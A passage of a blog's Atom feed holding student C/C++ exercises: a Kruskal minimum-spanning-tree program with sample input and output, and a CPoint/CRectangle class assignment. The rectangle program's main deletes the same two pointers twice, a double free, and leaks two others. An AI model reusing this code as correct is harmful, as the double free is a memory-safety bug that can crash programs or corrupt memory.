find_mfset(S, vj))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">min_mfset</span><span class="params">(MFSet &amp;S, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span><span class="comment">//和并i j所在的两个集合</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i &lt; <span class="number">0</span> || i &gt; S.n - <span class="number">1</span> || j &lt; <span class="number">0</span> || j &gt; S.n - <span class="number">1</span>) </span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(S.nodes[i].parent &gt; S.nodes[j].parent)</span><br><span class="line">	&#123;</span><br><span class="line">		S.nodes[j].parent += S.nodes[i].parent;</span><br><span class="line">		S.nodes[i].parent = j;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		S.nodes[i].parent += S.nodes[j].parent;</span><br><span class="line">		S.nodes[j].parent = i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//交换L中elem[low..high]的记录，枢轴记录到位，并返回其所在位置，此时在它之前的记录均不大于它</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Partition</span><span class="params">(ArcCellType arcs[], <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pivotkey;</span><br><span class="line"></span><br><span class="line">	arcs[<span class="number">0</span>].adj = arcs[low].adj;<span class="comment">//用子表的第一个记录作枢轴记录</span></span><br><span class="line">    arcs[<span class="number">0</span>].vi = arcs[low].vi;</span><br><span class="line">    arcs[<span class="number">0</span>].vj = arcs[low].vj;</span><br><span class="line">    pivotkey = arcs[low].adj;<span class="comment">//用权值做关键字</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span>(low &lt; high &amp;&amp; arcs[high].adj &gt;= pivotkey)</span><br><span class="line">			--high;</span><br><span class="line">		arcs[low].adj = arcs[high].adj;<span class="comment">//将比枢轴记录小的记录移到低端</span></span><br><span class="line">		arcs[low].vi = arcs[high].vi;</span><br><span class="line">		arcs[low].vj = arcs[high].vj;</span><br><span class="line">		<span class="keyword">while</span>(low &lt; high&amp;&amp;arcs[low].adj &lt;= pivotkey)</span><br><span class="line">			++low;</span><br><span class="line">		arcs[high].adj = arcs[low].adj;<span class="comment">//将比枢轴记录大的记录移到高端</span></span><br><span class="line">		arcs[high].vi = arcs[low].vi;</span><br><span class="line">		arcs[high].vj = arcs[low].vj;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	arcs[low].adj = arcs[<span class="number">0</span>].adj;</span><br><span class="line">	arcs[low].vi = arcs[<span class="number">0</span>].vi;</span><br><span class="line">	arcs[low].vj = arcs[<span class="number">0</span>].vj;</span><br><span class="line">	<span class="keyword">return</span> low; <span class="comment">// 返回枢轴位置</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QSort</span><span class="params">(ArcCellType arcs[], <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span><span class="comment">//对L中的L.elem[low..high]作快速排序</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> pivotloc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(low &lt; high)<span class="comment">//长度大于1</span></span><br><span class="line">	&#123;</span><br><span class="line">		pivotloc = Partition(arcs, low, high);</span><br><span class="line">		QSort(arcs, low, pivotloc - <span class="number">1</span>);</span><br><span class="line">		QSort(arcs, pivotloc + <span class="number">1</span>, high);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">minspantree</span><span class="params">(MGraph &amp;G, MFSet &amp;S)</span><span class="comment">//克鲁斯尔算法求最小生成树</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ecnum, i, v, w;</span><br><span class="line">	FILE *output;</span><br><span class="line"></span><br><span class="line">	output = fopen(<span class="string">"mincstreeOutput.txt"</span>, <span class="string">"w"</span>); </span><br><span class="line">	QSort(G.arcs, <span class="number">1</span>, G.arcnum);</span><br><span class="line">	i = <span class="number">1</span>;</span><br><span class="line">	ecnum = G.vexnum; <span class="comment">//连通分量个数</span></span><br><span class="line">	<span class="keyword">while</span>(ecnum &gt; <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		v = find_mfset(S, G.arcs[i].vi);</span><br><span class="line">		w = find_mfset(S, G.arcs[i].vj);</span><br><span class="line">		<span class="keyword">if</span>(!is_mfset(S,G.arcs[i].vi, G.arcs[i].vj)) <span class="comment">//两个端点不在一个等价类</span></span><br><span class="line">		&#123;</span><br><span class="line">			min_mfset(S, v, w); <span class="comment">//合并连通分量</span></span><br><span class="line">		    <span class="built_in">printf</span>(<span class="string">"%c%c %d\n"</span>, G.vexs[G.arcs[i].vi].vex, G.vexs[G.arcs[i].vj].vex, G.arcs[i].adj);</span><br><span class="line">	  		<span class="comment">//文件输出最小生成树的各条边以及相应的权值</span></span><br><span class="line">	  		<span class="built_in">fprintf</span>(output, <span class="string">"%c%c %d\n"</span>, G.vexs[G.arcs[i].vi].vex, G.vexs[G.arcs[i].vj].vex, G.arcs[i].adj); </span><br><span class="line">		    ecnum--;</span><br><span class="line">		&#125;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	MGraph G; <span class="comment">//无向图结构G</span></span><br><span class="line">	MFSet S; <span class="comment">//等价结构类S</span></span><br><span class="line">	CreateAN(G); <span class="comment">//构造无向结构图G</span></span><br><span class="line">	InitMfset(S, G); <span class="comment">//初始化结构类S</span></span><br><span class="line">	minspantree(G, S); <span class="comment">//克鲁斯尔算法求最小生成树</span></span><br><span class="line">	system(<span class="string">"pause"</span>);    <span class="comment">//程序运行结束保留窗口</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>mincstree.txt</code><br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">14</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line"><span class="literal">d</span></span><br><span class="line"><span class="literal">e</span></span><br><span class="line"><span class="literal">f</span></span><br><span class="line"><span class="keyword">g</span></span><br><span class="line"><span class="literal">h</span></span><br><span class="line">a b 4</span><br><span class="line">a c 3</span><br><span class="line">b <span class="keyword">e</span> 9</span><br><span class="line">b <span class="keyword">d</span> 5</span><br><span class="line">b c 5</span><br><span class="line">c <span class="keyword">d</span> 5</span><br><span class="line">c <span class="keyword">h</span> 5</span><br><span class="line"><span class="keyword">h</span> <span class="keyword">g</span> 6</span><br><span class="line"><span class="keyword">h</span> <span class="keyword">d</span> 4</span><br><span class="line"><span class="keyword">d</span> <span class="keyword">e</span> 7</span><br><span class="line"><span class="keyword">d</span> f 6</span><br><span class="line"><span class="keyword">d</span> <span class="keyword">g</span> 5</span><br><span class="line"><span class="keyword">e</span> f 3</span><br><span class="line">f <span class="keyword">g</span> 2</span><br></pre></td></tr></table></figure></p>
<p><code>mincstreeOutput.txt</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fg</span> <span class="number">2</span></span><br><span class="line">ac <span class="number">3</span></span><br><span class="line">ef <span class="number">3</span></span><br><span class="line">ab <span class="number">4</span></span><br><span class="line">hd <span class="number">4</span></span><br><span class="line"><span class="built_in">cd</span> <span class="number">5</span></span><br><span class="line">dg <span class="number">5</span></span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>1.本程序是用于实现最小生成树：若要在n个城市间建设通信网络，只需要架设n-1条线路即可。要想用最低的经济代价建设这个通信网，可以用网的最小生成树来解决。<br>2.用存储边的数组表示的无向网来表示n个城市间的通信线路，利用克鲁斯尔算法求网的最小生成树，定义数据类型MFSet，用来构造生成树过程中的连通分量。<br>3.程序以用户和计算机的对话方式执行，即在计算机终端上显示“提示信息”之后，由用户先在.txt文档中输入所需要测试的数据，然后运行程序，在程序运行结束之后会显示相应的运行结果，并会相应的生成输出的.txt的文件。<br>4.程序执行的命令包括：<br>    提前输入相应的测试数据；<br>    创建最小生成树；<br>]]>
    
    </summary>
    
      <category term="c++" scheme="http://edward-l.github.io/tags/c/"/>
    
      <category term="c++" scheme="http://edward-l.github.io/categories/c/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[c++ 类&对象（二）]]></title>
    <link href="http://edward-l.github.io/2014/12/07/c++%20%E7%B1%BB&%E5%AF%B9%E8%B1%A1%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://edward-l.github.io/2014/12/07/c++ 类&对象（二）/</id>
    <published>2014-12-07T07:30:16.000Z</published>
    <updated>2014-12-09T09:25:37.000Z</updated>
    <content type="html"><![CDATA[<p>1、 设计描述平面坐标上的点CPoint类，该类满足下述要求：<br>•具有x，y坐标信息；<br>•具有带默认形参值的构造函数，参数分别用于初始化x和y坐标信息；<br>•具有获取x、y信息的GetX和GetY函数，具有设置x、y信息的SetX和SetY函数；<br><a id="more"></a><br>2、 设计一个矩形类CRectangle，该类满足下述要求：<br>•具有矩形的左下角和右上角两个点的坐标信息，这两个点的数据类型是CPoint；<br>•具有带参数的构造函数CRectangle(const CPoint &amp;, const CPoint &amp;)，参数分别用于设置左下角和右上角两个点的坐标信息；<br>•具有设置左下角和设置右上角的两个点坐标的功能SetLPoint(const CPoint &amp;)和SetRPoint(const CPoint &amp;)；<br>•具有获得周长（GetPerimeter）和获得面积（GetArea）的功能。<br>3、 在main函数中，完成以下工作：<br>•动态创建一个CRectangle类的对象a_rectagnle，其初始的左下角和右上角坐标分别为（2,5）、（6,8）；调用GetPerimeter和GetArea获得矩形周长和面积，并将周长和面积显示在屏幕上；<br>•调用SetLPoint设置a_rectagnle的左下角为（4，6），调用SetRPoint设置a_rectagnle的右上角为（7，9）；调用GetPerimeter和GetArea获得矩形周长和面积，并将周长和面积显示在屏幕上；<br>•销毁该动态创建的对象。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  main.cpp</span></span><br><span class="line"><span class="comment">//  6-1</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//  Created by  Edward.L on 12/6/14.</span></span><br><span class="line"><span class="comment">//  Copyright (c) 2014  Edward.L. All rights reserved.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;iostream&gt;</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> &lt;cmath&gt;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> CPoint &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CPoint()&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    CPoint(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span><br><span class="line">    &#123;</span><br><span class="line">        x = a;</span><br><span class="line">        y = b;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">GetX</span><span class="params">()</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">GetY</span><span class="params">()</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> y;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">SetX</span><span class="params">(<span class="keyword">int</span> a)</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        x = a;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"x = "</span> &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">SetY</span><span class="params">(<span class="keyword">int</span> b)</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        y = b;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"y = "</span> &lt;&lt; y &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> CRectangle&#123;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    CRectangle()</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    CRectangle(<span class="keyword">const</span> CPoint &amp;a, <span class="keyword">const</span> CPoint &amp;b)</span><br><span class="line">    &#123;</span><br><span class="line">        cpoint1 = a;</span><br><span class="line">        cpoint2 = b;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">SetLpoint</span><span class="params">(<span class="keyword">const</span> CPoint &amp;a)</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        cpoint1 = a;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">SetRpoint</span><span class="params">(<span class="keyword">const</span> CPoint &amp;b)</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        cpoint2 = b;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">GetPerimeter</span><span class="params">()</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        perimeter = (<span class="built_in">fabs</span>(cpoint1.GetX()-cpoint2.GetX())+<span class="built_in">fabs</span>(cpoint1.GetY()-cpoint2.GetY()))*<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"permeter = "</span> &lt;&lt; perimeter &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">GetArea</span><span class="params">()</span></span><br><span class="line">    </span>&#123;</span><br><span class="line">        area = <span class="built_in">fabs</span>(cpoint1.GetX()-cpoint2.GetX()) * <span class="built_in">fabs</span>(cpoint1.GetY()-cpoint2.GetY());</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"area = "</span> &lt;&lt; area &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    CPoint cpoint1, cpoint2;</span><br><span class="line">    <span class="keyword">int</span> perimeter,area;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    CPoint * A = <span class="keyword">new</span> CPoint(<span class="number">2</span>,<span class="number">5</span>);</span><br><span class="line">    CPoint * B = <span class="keyword">new</span> CPoint(<span class="number">6</span>,<span class="number">8</span>);</span><br><span class="line">    <span class="function">CRectangle <span class="title">crectangle1</span><span class="params">(*A, *B)</span></span>;</span><br><span class="line">    crectangle1.GetPerimeter();</span><br><span class="line">    crectangle1.GetArea();</span><br><span class="line">    <span class="keyword">delete</span> A;</span><br><span class="line">    <span class="keyword">delete</span> B;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"set the point again: "</span> &lt;&lt; endl;</span><br><span class="line">    CPoint * C =<span class="keyword">new</span> CPoint(<span class="number">4</span>,<span class="number">6</span>);</span><br><span class="line">    CPoint * D =<span class="keyword">new</span> CPoint(<span class="number">7</span>,<span class="number">9</span>);</span><br><span class="line">    crectangle1.SetLpoint(*C);</span><br><span class="line">    crectangle1.SetRpoint(*D);</span><br><span class="line">    crectangle1.GetPerimeter();</span><br><span class="line">    crectangle1.GetArea();</span><br><span class="line">    <span class="keyword">delete</span> A;</span><br><span class="line">    <span class="keyword">delete</span> B;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>1、 设计描述平面坐标上的点CPoint类，该类满足下述要求：<br>•具有x，y坐标信息；<br>•具有带默认形参值的构造函数，参数分别用于初始化x和y坐标信息；<br>•具有获取x、y信息的GetX和GetY函数，具有设置x、y信息的SetX和SetY函数；<br>]]>
    
    </summary>
    
      <category term="c++" scheme="http://edward-l.github.io/tags/c/"/>
    
      <category term="c++" scheme="http://edward-l.github.io/categories/c/"/>
    
  </entry>
  
</feed>